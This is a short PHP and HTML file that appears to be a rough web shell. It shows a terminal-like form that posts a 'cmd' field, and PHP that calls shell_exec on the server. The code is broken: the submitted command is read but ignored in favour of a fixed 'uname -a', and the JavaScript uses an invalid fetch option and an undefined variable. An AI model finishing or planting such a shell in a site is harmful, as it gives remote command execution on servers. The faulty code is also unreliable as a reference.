<body style="margin: 0;padding: 0">
	<form method="post" onsubmit="return false" id="input">
		<div style="margin: 0;padding: 2rem;width: 100%;height: auto;display: flex">
			<input type="button" value="$" style="width: 5%">
			<input name="cmd" type="text" placeholder="sudo -h" style="width: 85%">
			<input id="exec" type="submit" value="exec" style="width: 10%">
		</div>
	</form>
	<div style="margin: 0;padding: 0 2rem 2rem 2rem;width: 100%;height: 100%;display: flex;">
		<textarea id="output" style="width: 100%;height: 75%; padding: 1em;font-size: 7px">
		</textarea>
	</div>
	<script type="text/javascript">
		const input = document.getElementById("input");
		const exec = document.getElementById("exec");
		const output = document.getElementById("output");
		
		exec.onclick = function () {
			fetch('/', {
				method: 'POST',
				data: input
			}).then(async data => {
				alert(data)
			}).catch(e => {
				alert(e);
			})
			output.value = script.innerText;
		} 
	</script>
</body>
<?php
$data = $_POST["cmd"];
echo shell_exec("uname -a");
?>
